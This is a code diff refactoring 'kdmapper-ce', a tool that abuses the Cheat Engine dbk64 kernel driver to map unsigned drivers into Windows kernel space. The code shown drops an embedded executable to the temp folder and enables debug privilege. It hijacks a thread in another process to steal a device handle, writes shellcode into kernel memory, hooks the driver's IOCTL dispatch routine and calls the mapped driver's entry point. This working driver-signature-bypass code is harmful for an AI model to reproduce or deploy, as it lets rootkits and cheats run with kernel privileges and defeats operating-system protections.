@@ -3,69 +3,6 @@
 PVOID64 kdmapper_ce::pMmGetSystemRoutineAddress = NULL;
 PVOID64 kdmapper_ce::pIofCompleteRequest = NULL;
 
-HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
-
-    HANDLE result = INVALID_HANDLE_VALUE;
-
-    // drop kernelmoduleunloader.exe into the %temp% folder
-
-    std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
-    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));
-
-    // adjust process token
-
-    BOOL bRet = FALSE;
-    HANDLE hToken = NULL;
-    LUID luid = { 0 };
-
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
-    {
-        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
-        {
-            TOKEN_PRIVILEGES tokenPriv = { 0 };
-            tokenPriv.PrivilegeCount = 1;
-            tokenPriv.Privileges[0].Luid = luid;
-            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
-        }
-    }
-    if (!bRet) {
-        Error("RtlAdjustPrivilege failed");
-        return result;
-    }
-
-    // spawn kernelmoduleunloader.exe process
-    // TODO: hide kernelmoduleunloader's popup
-
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    if (!CreateProcess(NULL,
-        (LPWSTR)UnloaderPath.c_str(),
-        NULL,
-        NULL,
-        TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        &si,
-        &pi))
-    {
-        Error("CreateProcess failed 0x%x", GetLastError());
-        return result;
-    }
-
-    result = pi.hProcess;
-    //CloseHandle(pi.hThread);
-    //CloseHandle(pi.hProcess);
-    return result;
-}
-
 HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
 
     // Perform thread hijacking methods on the target process
@@ -89,9 +26,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
         if (threadEntry.th32OwnerProcessID == targetProcessID)
         {
 
-#ifdef _DEBUG
             Log("kdmapper-ce.exe processID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);
-#endif // _DEBUG
 
             targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
             break;
@@ -132,11 +67,11 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
 
     Sleep(1000); // 1s
 
-    // pattern��kernelmoduleunloader�̃v���Z�X���������X�L����
+    // search for patterns in kernelmoduleunloader.exe process memory
 
-    MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };
+    utils::MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };
 
-    MEMORY_PATTERN* tmp_pattern = (MEMORY_PATTERN*)SearchMemoryForPattern(
+    utils::MEMORY_PATTERN* tmp_pattern = (utils::MEMORY_PATTERN*)utils::SearchProcessMemoryForPattern(
         hTargetProcess,
         pattern,
         PAGE_READWRITE,
@@ -145,7 +80,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
     );
 
 #ifdef _DEBUG
-    //Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
+    Log2("pattern: 0x%x, 0x%d, 0x%x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
 #endif // DEBUG
 
     if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
@@ -155,67 +90,12 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
     return hDevice;
 }
 
-LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {
-
-    LPVOID offset = 0;
-    LPVOID lpBuffer = NULL;
-    MEMORY_BASIC_INFORMATION mbi = {};
-
-    lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
-    if (lpBuffer == NULL) {
-        Error("VirtualAlloc failed");
-        return NULL;
-    }
-
-#ifdef _DEBUG
-    //printf("BaseAddress");
-    //printf("\tRegionSize");
-    //printf("\tProtect");
-    //printf("\tState");
-    //printf("\tType\n");
-#endif // _DEBUG
-
-    while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
-    {
-
-#ifdef _DEBUG
-        //printf("0x%llx", mbi.BaseAddress);
-        //printf("\t%llx", mbi.RegionSize);
-        //printf("\t%lx", mbi.AllocationProtect);
-        //printf("\t%lx", mbi.State);
-        //printf("\t%lx\n", mbi.Type);
-#endif // _DEBUG
-
-        // Compare patterns
-
-        ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
-        SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));
-
-        if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
-        {
-            Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
-            break;
-        }
-
-        if (mbi.BaseAddress > (PVOID)0x7fffffff)
-        {
-            Error("Scan error: No pattern found");
-            break;
-        }
-
-        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
-    }
-
-    return lpBuffer;
-}
-
-
 HANDLE kdmapper_ce::GetDbk64DeviceHandle()
 {
     HANDLE hDbk64 = INVALID_HANDLE_VALUE;
     HANDLE hKernelModuleUnloader = INVALID_HANDLE_VALUE;
 
-    hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
+    hKernelModuleUnloader = utils::CreateKernelModuleUnloaderProcess();
     if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
         Error("CreateKernelModuleUnloaderProcess failed");
         return hDbk64;
@@ -234,7 +114,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandle()
         CloseHandle(hKernelModuleUnloader);
         return hDbk64;
     }
-
+    
     // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce
 
     if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
@@ -285,6 +165,7 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
         }
 
         Log("Validity of the inputted driver: Valid");
+        Log("Map the input driver to kernel space...");
 
         uint32_t ImageSize = ntHeaders->OptionalHeader.SizeOfImage;
 
@@ -294,9 +175,7 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
             break;
         }
 
-        Log("Kernel memory has been allocatted at 0x%p", KernelBuf);
-
-        // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする
+        // Create an MDL for the buffer allocated above and make it accessible from user space
 
         VOID* SharedBuf = NULL;
         UINT64 Mdl = NULL;
@@ -306,7 +185,7 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
             break;
         }
 
-        Log("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);
+        Log2("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);
 
         // Copy image headers
 
@@ -322,7 +201,7 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
             auto sectionDestination = (LPVOID)((DWORD_PTR)SharedBuf + (DWORD_PTR)section->VirtualAddress);
             auto sectionBytes = (LPVOID)((DWORD_PTR)hDriver + (DWORD_PTR)section->PointerToRawData);
             memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
-            Log("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
+            Log2("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
             section++;
         }
 
@@ -343,20 +222,15 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
             break;
         }
 
-        Log("Successfully removed shared memory from user space...");
+        Log2("Successfully removed shared memory from user space...");
 
         // Call driver entry point
 
         const uint64_t address_of_entry_point = (uint64_t)KernelBuf + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+        PCWSTR DriverObjectName = L"\\Driver\\TDLD";
 
-        //Log("Calling DriverEntry 0x%p", address_of_entry_point);
-        //if (!kdmapper_ce::CallDriverEntry(dbk64_device_handle, address_of_entry_point)) {
-        //    Error("Failed to call driver entry");
-        //    break;
-        //}
-
-        Log("Calling DriverEntry 0x%p", address_of_entry_point);
-        if (!kdmapper_ce::CreateDriverObject(dbk64_device_handle, address_of_entry_point, L"\\Driver\\TDLD")) {
+        Log("Create DriverObjectName : %ls", DriverObjectName);
+        if (!kdmapper_ce::CreateDriverObject(dbk64_device_handle, address_of_entry_point, DriverObjectName)) {
             Error("CreateDriverObject failed");
             break;
         }
@@ -392,7 +266,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
 
         // Place IRP_MJ_DEVICE_CONTROL patch shellcode in kernel space.
 
-        kernelShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcode, shellcodeSize);
+        kernelShellcodeBuf = ce_driver::WriteNonPagedMemory(dbk64_device_handle, shellcode, shellcodeSize);
         if (kernelShellcodeBuf == nullptr) {
             Error("WriteNonPagedMemory first shellcode failed");
             break;
@@ -400,7 +274,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
 
         // Place hooked ioctl shellcode in kernel space
 
-        ioctlShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcodeIoctl, shellcodeIoctlSize);
+        ioctlShellcodeBuf = ce_driver::WriteNonPagedMemory(dbk64_device_handle, shellcodeIoctl, shellcodeIoctlSize);
         if (ioctlShellcodeBuf == nullptr) {
             Error("WriteNonPagedMemory second shellcode failed");
             break;
@@ -412,7 +286,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
         pisParameters.HookFunctionAddress = (LPVOID)ioctlShellcodeBuf;
         pisParameters.dummy = NULL;
 
-        kernelParamAddr = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, &pisParameters, sizeof(KernelPisParameters));
+        kernelParamAddr = ce_driver::WriteNonPagedMemory(dbk64_device_handle, &pisParameters, sizeof(KernelPisParameters));
         if (kernelParamAddr == nullptr) {
             Error("WriteNonPagedMemory second shellcode param failed");
             break;
@@ -450,7 +324,7 @@ BOOL kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_import
             uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());
 
             //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
-            Log("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);
+            Log2("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);
             //            if (!function_address) {
             //                //Lets try with ntoskrnl
             //                if (Module != ntoskrnlAddr) {
@@ -469,43 +343,6 @@ BOOL kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_import
     }
 
     return true;
-}
-
-PVOID64 kdmapper_ce::WriteNonPagedMemory(HANDLE hDevice, PVOID lpBuffer, SIZE_T nSize) {
-    
-    UINT64 kernelShellcodeBuf = NULL;
-    UINT64 sharedBuf = NULL;
-    UINT64 Mdl = NULL;
-
-    kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(hDevice, nSize);
-    if (kernelShellcodeBuf == NULL) {
-        Error("AllocateNoPagedMem failed");
-        return nullptr;
-    }
-
-    Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);
-
-    // Create an MDL for the buffer allocated above and make it accessible from user space.
-
-    if (!ce_driver::CreateSharedMemory(hDevice, kernelShellcodeBuf, &sharedBuf, &Mdl, nSize)) {
-        Error("CreateSharedMemory failed");
-        return nullptr;
-    }
-
-    Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", sharedBuf, Mdl);
-
-    // Write shellcode to shared memory
-
-    memcpy((void*)sharedBuf, lpBuffer, nSize);
-
-    // Unmapping of memory allocated to user space
-
-    if (!ce_driver::UnMapSharedMemory(hDevice, sharedBuf, Mdl)) {
-        Error("UnMapSharedMemory failed");
-        return nullptr;
-    }
-
-    return (PVOID64)kernelShellcodeBuf;
 }
 
 PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functionName) {
